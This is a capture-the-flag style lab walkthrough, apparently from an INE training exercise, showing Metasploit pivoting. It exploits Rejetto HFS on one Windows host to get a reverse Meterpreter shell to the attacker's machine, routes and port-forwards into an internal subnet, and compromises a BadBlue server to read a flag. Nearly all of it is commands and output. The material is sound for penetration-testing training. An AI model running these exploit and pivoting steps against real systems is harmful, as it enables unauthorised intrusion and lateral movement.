# Pivoting

Exploit victim 1
```bash
# Nmap victim1
msf6 > db_nmap -sV -O 10.0.19.123
[*] Nmap: Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-25 10:42 IST
[*] Nmap: Nmap scan report for demo1.ine.local (10.0.19.123)
[*] Nmap: Host is up (0.0030s latency).
[*] Nmap: Not shown: 990 closed tcp ports (reset)
[*] Nmap: PORT      STATE SERVICE            VERSION
[*] Nmap: 80/tcp    open  http               HttpFileServer httpd 2.3
[*] Nmap: 135/tcp   open  msrpc              Microsoft Windows RPC
[*] Nmap: 139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
[*] Nmap: 3389/tcp  open  ssl/ms-wbt-server?
[*] Nmap: 49152/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49153/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49154/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49155/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49165/tcp open  msrpc              Microsoft Windows RPC

msf6 > use rejetto
msf6 exploit(windows/http/rejetto_hfs_exec) > set rhosts 10.0.19.123 
rhosts => 10.0.19.123
msf6 exploit(windows/http/rejetto_hfs_exec) > run

[*] Started reverse TCP handler on 10.10.43.2:4444 
[*] Using URL: http://10.10.43.2:8080/uJTPZ6bED5Yf4
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /uJTPZ6bED5Yf4
[*] Sending stage (176198 bytes) to 10.0.19.123
[!] Tried to delete %TEMP%\FBcWJHFbxJGG.vbs, unknown result
[*] Meterpreter session 1 opened (10.10.43.2:4444 -> 10.0.19.123:49259) at 2025-07-25 10:47:34 +0530
[*] Server stopped.

meterpreter > 
```

Prepare for pivoting
```bash
meterpreter > ipconfig

Interface  1
============
Name         : Software Loopback Interface 1
Hardware MAC : 00:00:00:00:00:00
MTU          : 4294967295
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff


Interface 12
============
Name         : AWS PV Network Device #0
Hardware MAC : 06:63:c0:9e:82:bf
MTU          : 9001
IPv4 Address : 10.0.19.123       <- victim1 IP address
IPv4 Netmask : 255.255.240.0
IPv6 Address : fe80::5884:fb58:c69a:4724
IPv6 Netmask : ffff:ffff:ffff:ffff::


Interface 14
============
Name         : Microsoft ISATAP Adapter
Hardware MAC : 00:00:00:00:00:00
MTU          : 1280
IPv6 Address : fe80::5efe:a00:137b
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff

# Add network to the subnet
meterpreter > run autoroute -s 10.0.19.0/20

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 10.0.19.0/255.255.240.0...
[+] Added route to 10.0.19.0/255.255.240.0 via 10.0.19.123
[*] Use the -p option to list all active routes
meterpreter > 

meterpreter > 
Background session 1? [y/N]  
msf6 exploit(windows/http/rejetto_hfs_exec) >
```

Enumerate service running on victim 2
```bash
# Portscan didn't work
msf6 exploit(windows/http/rejetto_hfs_exec) > search portscan

msf6 exploit(windows/http/rejetto_hfs_exec) > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set rhosts 10.0.23.138
rhosts => 10.0.23.138
msf6 auxiliary(scanner/portscan/tcp) > set ports 1-100
ports => 1-100

msf6 auxiliary(scanner/portscan/tcp) > run

[+] 10.0.23.138:          - 10.0.23.138:80 - TCP OPEN
[*] 10.0.23.138:          - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

# back to session 1
msf6 auxiliary(scanner/portscan/tcp) > sessions 1
[*] Starting interaction with 1...

meterpreter > 

# Set port forwarning
meterpreter > portfwd add -l 1234 -p 80 -r 10.0.23.138
[*] Forward TCP relay created: (local) :1234 -> (remote) 10.0.23.138:80

meterpreter > 
Background session 1? [y/N] 
```

```bash
msf6 auxiliary(scanner/portscan/tcp) > db_nmap -sS -sV -p 1234 localhost
[*] Nmap: Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-25 11:01 IST
[*] Nmap: Nmap scan report for localhost (127.0.0.1)
[*] Nmap: Host is up (0.000052s latency).
[*] Nmap: Other addresses for localhost (not scanned): ::1
[*] Nmap: PORT     STATE SERVICE VERSION
[*] Nmap: 1234/tcp open  http    BadBlue httpd 2.7
[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

msf6 exploit(windows/http/badblue_passthru) > 
msf6 exploit(windows/http/badblue_passthru) > set payload windows/meterpreter/bind_tcp
payload => windows/meterpreter/bind_tcp

msf6 exploit(windows/http/badblue_passthru) > set payload windows/meterpreter/bind_tcp
payload => windows/meterpreter/bind_tcp
msf6 exploit(windows/http/badblue_passthru) > set rhosts 10.0.23.138 
rhosts => 10.0.23.138
msf6 exploit(windows/http/badblue_passthru) > set lport 4433
lport => 4433

msf6 exploit(windows/http/badblue_passthru) > run

[*] Trying target BadBlue EE 2.7 Universal...
[*] Started bind TCP handler against 10.0.23.138:4433
[*] Sending stage (176198 bytes) to 10.0.23.138
[*] Meterpreter session 4 opened (10.0.19.123:49497 -> 10.0.23.138:4433 via session 2) at 2025-07-25 11:21:52 +0530

meterpreter > 
```

Flag
```bash
C:\>type flag.txt
type flag.txt
c46d12f28d87ae0b92b05ebd9fb8e817
```